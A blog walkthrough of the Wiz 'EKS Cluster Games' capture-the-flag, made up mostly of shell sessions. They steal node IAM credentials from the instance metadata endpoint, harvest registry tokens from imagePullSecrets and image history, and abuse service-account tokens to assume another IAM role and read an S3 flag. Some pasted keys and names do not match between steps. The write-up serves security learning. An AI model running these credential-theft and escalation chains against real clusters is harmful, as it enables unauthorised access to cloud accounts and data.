---
title: "EKS Cluster Games"
date: 2025-09-30
tags:
  - aws
  - ctf
  - eks
  - kubernetes
layout: layouts/post.njk
permalink: /eks-cluster-games/
---
CTF challenges [continue](/the-big-iam-challenge/) to be one of my interests for their ability to show me even more ways in which my allegedly "secure" and "solid" infrastructure setup can be accessed by a malicious actor. This time we're gonna discuss the second challenge in a series of CTFs made by [WIZ](https://www.wiz.io/ctf): [EKS Cluster Games](https://eksclustergames.com/).

<!-- more -->

![image](/assets/eks-cluster-games.webp)

## Secret Seeker

::: info Task

    Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

:::

Kubernetes policy:

```json
{
    "secrets": [
        "get",
        "list"
    ]
}
```

For this task we're provided with the following permissions: we can list and read secrets. Okay, let's do exactly that.

But before diving into Kubernetes resources, we have a nice welcome message:

```bash
Welcome to Wiz EKS Challenge!
For your convenience, the following directories are persistent across sessions:
        * /home/user
        * /tmp

Use kubectl to start!
```

All right! Having the home directory persistent across sessions means we can make our job easier. Let's start with *the* alias:

```bash
echo 'alias k="kubectl"' >> ~/.bashrc && source ~/.bashrc
```

And now we won't have to type the long `kubectl` command ever again (in the scope of this challenge, that is.)

Now to the task itself.

```bash
root@wiz-eks-challenge:~# k get secret
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      674d
root@wiz-eks-challenge:~# k get secret log-rotate -o yaml
apiVersion: v1
data:
  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
kind: Secret
{...}
```

And there is our flag! Let's decode it and see the value:

```bash
root@wiz-eks-challenge:~# echo 'd2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==' | base64 -d
wiz_eks_challenge{omg_over_privileged_secret_access}
```

So far so good. This was a breeze. Let's see if the following challenges will be as easy.

## Registry Hunt

::: info Task

    A thing we learned during our research: always check the container registries.

:::

Kubernetes policy:

```json
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

With the given policy we can list and get pods, and we can get secrets. But oh bother, we can't actually list secrets! So we will have to somehow find them. Let's start with pods.

```bash
root@wiz-eks-challenge:~# k get pods
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-14f9769b   1/1     Running   0          23d
root@wiz-eks-challenge:~# k describe pod database-pod-14f9769b
Name:         database-pod-14f9769b
Namespace:    challenge2
Priority:     0
<...omitted for brevity...>
root@wiz-eks-challenge:~# k describe pod database-pod-14f9769b | grep -i secret
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-8cw9p (ro)
root@wiz-eks-challenge:~# ls -l /var/run/secrets/kubernetes.io/serviceaccount/
total 12
-rw-r--r--. 1 nobody nogroup 1099 Sep  5 19:47 ca.crt
-rw-r--r--. 1 nobody nogroup   11 Sep  5 19:45 namespace
-rw-r--r--. 1 nobody nogroup 1010 Sep  5 19:45 token
```

Eh, nothing of interest here. Let's try a different approach.

```bash
root@wiz-eks-challenge:~# k get pod database-pod-14f9769b -o yaml
apiVersion: v1
kind: Pod
metadata: {...}
spec:
  {...}
  imagePullSecrets:
  - name: registry-pull-secrets-16ae8e51
  {...}
```

Booyah! There we have it! A handy-dandy `imagePullSecrets` parameter waiting just for us.

```bash
root@wiz-eks-challenge:~# k get secret registry-pull-secrets-16ae8e51 -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
{...}
root@wiz-eks-challenge:~# k get secret registry-pull-secrets-16ae8e51 -o json | jq -r '.data.".dockerconfigjson"' | base64 -d
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}
```

From the `auth` string we can extract the credentials to log in to the registry:

```bash
root@wiz-eks-challenge:~# echo -n 'ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==' | base64 -d
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
root@wiz-eks-challenge:~# crane auth login docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
2025/09/05 19:57:55 logged in via /home/user/.docker/config.json
```

Nice! *I'm in!*

Now let's head for that image we're tasked to fetch and dissect.

```bash
root@wiz-eks-challenge:~# crane pull docker.io/eksclustergames/base_ext_image@sha256:c3c280fac41084a821ab0a32d16bd21a887141bcf1330e40adf086c0f0c97888 base_ext_image.tar.gzip
root@wiz-eks-challenge:~# ls -l
total 2104
-rw-r--r--. 1 root root 2150400 Sep  5 19:59 base_ext_image.tar.gzip
root@wiz-eks-challenge:~# tar xvzf base_ext_image.tar.gzip

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

Joke's on me here -- the pulled image was not actually a gzipped tar archive, but a tar archive consisting of several gzipped tar archives. Happens to the best of us!

```bash
root@wiz-eks-challenge:~# mv base_ext_image.tar.gzip base_ext_image.tar
root@wiz-eks-challenge:~# ls -l
total 2104
-rw-r--r--. 1 root root 2150400 Sep  5 19:59 base_ext_image.tar
root@wiz-eks-challenge:~# tar xvf base_ext_image.tar
sha256:62a84aabdaff849b4d1e976aa70ed4d4f5a8e6bed29c7a8fa25603803b72048d
90b9666d4aed1893ff122f238948dfd5e8efdcf6c444fe92371ea0f01750bf8c.tar.gz
71e23506d26b19d0d86d7ca64f9214c31a4ad9ccbff325b45be74ab2a6279e22.tar.gz
manifest.json
root@wiz-eks-challenge:~# ls -l
total 4212
-rw-r--r--. 1 root root     204 Jan  1  1970 71e23506d26b19d0d86d7ca64f9214c31a4ad9ccbff325b45be74ab2a6279e22.tar.gz
-rw-r--r--. 1 root root 2145249 Jan  1  1970 90b9666d4aed1893ff122f238948dfd5e8efdcf6c444fe92371ea0f01750bf8c.tar.gz
-rw-r--r--. 1 root root 2150400 Sep  5 19:59 base_ext_image.tar
-rw-r--r--. 1 root root     322 Jan  1  1970 manifest.json
-rw-r--r--. 1 root root     855 Jan  1  1970 sha256:62a84aabdaff849b4d1e976aa70ed4d4f5a8e6bed29c7a8fa25603803b72048d
root@wiz-eks-challenge:~# tar xvzf 71e23506d26b19d0d86d7ca64f9214c31a4ad9ccbff325b45be74ab2a6279e22.tar.gz
etc/
flag.txt
proc/
sys/
root@wiz-eks-challenge:~# cat flag.txt
wiz_eks_challenge{always_look_for_imagepullsecrets}
```

And here is the flag! Let's paste it to the task page and... Turns out this is the wrong flag! But how? Did I miss something?

Let's take a look at the image once more:

```bash
root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image:latest | jq
{
  {...}
  "history": [
    {...},
    {
      "created": "2025-08-13T14:12:01.893680673+03:00",
      "created_by": "RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' > /flag.txt # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {...}
  ],
  {...}
}
```

Oh, you! So THIS is the actual flag! I could never.

## Image Inquisition

::: info Task

    A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.

    Remember: You are running inside a compromised EKS pod.

:::

Kubernetes policy:

```json
{
    "pods": [
        "list",
        "get"
    ]
}
```

All right. Let's start with a quick R&R.

```bash
root@wiz-eks-challenge:~# k get pods
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-acbd5209   1/1     Running   0          23d
root@wiz-eks-challenge:~# k get pod accounting-pod-acbd5209 -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2025-08-13T11:22:21Z"
  generation: 1
  name: accounting-pod-acbd5209
  namespace: challenge3
  resourceVersion: "280912506"
  uid: ff755d4c-5581-4673-8e2f-5bd999882d5d
spec:
  containers:
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
{...}
root@wiz-eks-challenge:~# crane config 46681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
Error: fetching config: reading image "46681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4": GET https://46681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-579b0b7/manifests/sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: unexpected status code 401 Unauthorized: Not Authorized
root@wiz-eks-challenge:~# k exec -ti accounting-pod-acbd5209 -- /bin/bash
Error from server (Forbidden): pods "accounting-pod-acbd5209" is forbidden: User "system:serviceaccount:challenge3:service-account-challenge3" cannot create resource "pods/exec" in API group "" in the namespace "challenge3"
root@wiz-eks-challenge:~# aws sts get-caller-identity

Unable to locate credentials. You can configure credentials by running "aws configure".
root@wiz-eks-challenge:~# ls -la ~/.aws
ls: cannot access '/home/user/.aws': No such file or directory
root@wiz-eks-challenge:~# aws ecr list-images --repository-name entral_repo-579b0b7

Unable to locate credentials. You can configure credentials by running "aws configure".
root@wiz-eks-challenge:~# crane export 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4 -
Error: pulling 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-579b0b7/manifests/sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: unexpected status code 401 Unauthorized: Not Authorized
```

As we see, all the fun stuff is unavailable (expected, but still). Nothing interesting about the pod, no leftover credentials, and no access to the registry either.
Let's dive further. Specifically, let's explore the instance metadata -- perhaps we can find something of interest there.

```bash
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/
info
security-credentials/
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
eks-challenge-cluster-nodegroup-NodeInstanceRole
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMQUHHPZJM","Expiration":"2025-09-05 21:20:11+00:00","SecretAccessKey":"/ktJO622Y5GSAXmqdgv+ySje4QNGRgE+...","SessionToken":"FwoGZXIvYXdzECYaDGJ/..."}
```

Nice! We have session credentials which we can use to authorize the `awscli`.

```bash
root@wiz-eks-challenge:~# mkdir -p ~/.aws && cat << EOF > ~/.aws/credentials
> [default]
> aws_access_key = ASIA2AVYNEVMQUHHPZJM
> aws_secret_access_key = /ktJO622Y5GSAXmqdgv+ySje4QNGRgE+...
> session_token = FwoGZXIvYXdzECYaDGJ/...
> EOF
root@wiz-eks-challenge:~# aws ecr describe-registry

An error occurred (AccessDeniedException) when calling the DescribeRegistry operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0bd90a7fe60cdb9f7 is not authorized to perform: ecr:DescribeRegistry on resource: * because no identity-based policy allows the ecr:DescribeRegistry action
```

It seems that our role is limited, after all. But that's okay; in the end we mainly want to focus on the images in the registry, not the registry itself.

Let's use a neat command to get ECR login credentials.

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password
eyJwYXlsb2FkIjoicjlEOCt4Vnd6N01QWEx5bjN5dWdXTmpoQkFEZnNQZndjU25FQmd6WmRzRUg3T3ZsdURhc[...] # omitted for brevity
root@wiz-eks-challenge:~# echo -n '[base64-encoded-data]' | base64 -d
{"payload":"r9D8+xVwz7MPXLyn3yugWNjhBADfsPfwcSnEBgzZdsEH7OvluDarr29d85Hr...","datakey":"AQEBAHijEFXGwF1cipVOacG8qRmJoVBPay8LUUvU8RCVV0XoHwAAAH4wfAYJKoZIh...","version":"2","type":"DATA_KEY","expiration":1757147299}
```

Great! Several decoding attempts later it was clear to me that this is binary authorization data and I just have to pass it to a login command and not try to decode it all.

```bash
root@wiz-eks-challenge:~# aws ecr get-login-password --region us-west-1 | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
2025/09/05 20:30:48 logged in via /home/user/.docker/config.json
```

Now let's finally dissect the image that we're given.

```bash
root@wiz-eks-challenge:~# kubectl get pods accounting-pod-acbd5209 -o yaml | grep '\- image:'
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4 | jq
{
{...}
    {
      "created": "2025-08-13T11:22:17.044629915Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
{...}
}
```

Et voilà! And there we have it -- the secret we were looking for, nicely hidden in a Docker image layer.

## Pod Break

::: info Task

    You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?

:::


Kubernetes policy:

```json
{}
```

Oh, this is a fun one. We have no permissions on a Kubernetes cluster whatsoever and we have to access a service account.

We can start with the same approach as in a previous task: obtain credentials from the instance metadata.

```bash
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
eks-challenge-cluster-nodegroup-NodeInstanceRole
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole 2>/dev/null | jq
{
  "AccessKeyId": "ASIA2AVYNEVM2STWPOMB",
  "Expiration": "2025-09-05 21:33:34+00:00",
  "SecretAccessKey": "BY4ToDWNJniAbLyYzou...",
  "SessionToken": "FwoGZXIvYXdzECYaDNjSr8orzSsKmTYNbCK3AV9V7Vum3ITD7/..."
}
root@wiz-eks-challenge:~# mkdir -p ~/.aws && cat << EOF > ~/.aws/credentials
> [default]
> aws_access_key_id = ASIA2AVYNEVM2STWPOMB
> aws_secret_access_key = BY4ToDWNJniAbLyYzou...
> aws_session_token = FwoGZXIvYXdzECYaDNjSr8orzSsKmTYNbCK3AV9V7Vum3ITD7/...
> EOF
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0bd90a7fe60cdb9f7",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0bd90a7fe60cdb9f7"
}
```

Great! The credentials are obtained. Now, for the next step. With the help of the retrieved IAM role we can try to get an EKS authorization token.

```bash
root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2025-09-05T20:57:45Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFt..."
    }
}
```

All right, the token is here. Let's see what we have available.

```bash
root@wiz-eks-challenge:~# TOKEN=$(aws eks get-token --cluster-name=eks-challenge-cluster | jq '.status.token' | sed "s/\"//g")
root@wiz-eks-challenge:~# kubectl --token=$TOKEN get pods
No resources found in challenge4 namespace.
root@wiz-eks-challenge:~# kubectl --token=$TOKEN get all
Error from server (Forbidden): replicationcontrollers is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "replicationcontrollers" in API group "" in the namespace "challenge4"
Error from server (Forbidden): services is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "services" in API group "" in the namespace "challenge4"
Error from server (Forbidden): daemonsets.apps is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "daemonsets" in API group "apps" in the namespace "challenge4"
Error from server (Forbidden): deployments.apps is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "deployments" in API group "apps" in the namespace "challenge4"
Error from server (Forbidden): replicasets.apps is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "replicasets" in API group "apps" in the namespace "challenge4"
Error from server (Forbidden): statefulsets.apps is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "statefulsets" in API group "apps" in the namespace "challenge4"
Error from server (Forbidden): horizontalpodautoscalers.autoscaling is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "horizontalpodautoscalers" in API group "autoscaling" in the namespace "challenge4"
Error from server (Forbidden): cronjobs.batch is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "cronjobs" in API group "batch" in the namespace "challenge4"
Error from server (Forbidden): jobs.batch is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "jobs" in API group "batch" in the namespace "challenge4"
```

Not much is available. Oh well, let's try to access the basic secret stuff.

```bash
root@wiz-eks-challenge:~# kubectl --token=$TOKEN get secret
NAME        TYPE     DATA   AGE
node-flag   Opaque   1      674d
root@wiz-eks-challenge:~# kubectl --token=$TOKEN get secret node-flag -o json | jq -r '.data.flag' | base64 -d
wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}
```

Hey, it says we're real pros! That's so nice of them.

## Container Secrets Infrastructure

::: info Task

    You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?

:::

IAM role policy:

```json
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

IAM trust policy:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```

Kubernetes policy:

```json
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```

This task looks like an amalgam of all the previous tasks in this challenge. The policies, apart from giving us access to the desired flag, hint at what we actually can do with our permissions. For example, the audience in the trust policy is there for a reason. And we're given the ability to create a ServiceAccount token for a reason. (Unless, of course, this is exactly to throw us off the path -- but we will see that soon enough.)

Let's start with credentials.

```bash
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0bd90a7fe60cdb9f7",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0bd90a7fe60cdb9f7"
}
```

We have an assumed role for the instance, but it's of no interest to us. Let's try to find another role to assume.

```bash
root@wiz-eks-challenge:~# kubectl describe sa
Name:                debug-sa
Namespace:           challenge5
Labels:              <none>
Annotations:         description: This is a dummy service account with empty policy attached
                     eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
...

Name:                default
Namespace:           challenge5
...

Name:                s3access-sa
Namespace:           challenge5
Labels:              <none>
Annotations:         eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
...
```

As we can see, we have three ServiceAccounts available to us. Two of them have roles we can assume. And only one, it seems, is the role with actual permissions to access the flag.

For the next trick we would want to have a web identity token (JWT), which will allow us to assume the next-level role. Let's try to obtain one.

```bash
root@wiz-eks-challenge:~# kubectl create token s3access-sa --audience=sts.amazonaws.com
error: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"
```

Bummer. But what about another ServiceAccount?

```bash
root@wiz-eks-challenge:~# kubectl create token debug-sa --audience=sts.amazonaws.com
eyJhbGciOiJSUzI1NiIsImtpZCI6ImRmZjE4OGZjZDg3...
```

Bingo!

```bash
root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role \
  --role-session-name HeresJohnny
  --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6ImRmZjE4OGZjZDg3.... \
{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVMYGOPTRII",
        "SecretAccessKey": "87W2QkL9e1Mkdj4T0Zf/...",
        "SessionToken": "IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMSJHMEUCIQCfVepHS05hYgXgg8Eu9YwNC44WuH2...",
        "Expiration": "2025-09-30T12:38:48+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:HeresJohnny",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/HeresJohnny"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

Almost there! Now, the final stretch:

```bash
root@wiz-eks-challenge:~# export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMQEKAGCGB
root@wiz-eks-challenge:~# export AWS_SECRET_ACCESS_KEY=87W2QkL9e1Mkdj4T0Zf/...
root@wiz-eks-challenge:~# export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMSJHMEUCIQCfVepHS05hYgXgg8Eu9YwNC44WuH2...
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:imcoming",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/imcoming"
}
root@wiz-eks-challenge:~# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag - | cat
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
```

And there we have it! We really are EKS and AWS exploitation legends!

## Afterword

Yet another complicated and super-fun challenge. I was as frustrated by not understanding where to go as I was enjoying finding the breadcrumbs along the way that pointed to the next step. Even though the challenge is already two years old (at the time of writing), the lessons from the tasks are still very relevant today. It's never too late to learn something new about information systems security, and it's never a bad idea to remember common mistakes. Because as simple an attack as [SQL Injection](https://owasp.org/Top10/A03_2021-Injection/) is still in the [OWASP Top 10](https://owasp.org/www-project-top-ten/) Web Application Security Risks to this day.

Stay secure!

---

<p style="text-align: center; margin: 24px 0 24px 0;"><a href="mailto:reply@hatedabamboo.me?subject=Reply%20to%3A%20EKS%20Cluster%20Games">Reply to this post ✉️</a></p>
